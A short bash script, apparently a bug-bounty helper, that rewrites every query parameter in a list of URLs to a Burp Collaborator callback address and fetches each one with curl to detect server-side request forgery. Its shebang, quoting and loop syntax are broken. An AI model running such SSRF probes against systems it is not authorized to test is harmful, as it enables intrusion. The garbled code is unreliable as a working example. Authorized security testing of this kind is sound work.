#!bin/bash

############################## FAST SSRF #########################################
cat url.txt | tee Fast_SSRF.txt | qsreplace ' 'http://jf2lko48ltlfmgmngl2cnyay5pbfz4.burpcollaborator.net ' | while read host do ; do curl --silent --path-as-is --insecure "$host";done



# Input burp collab link from the user after http://
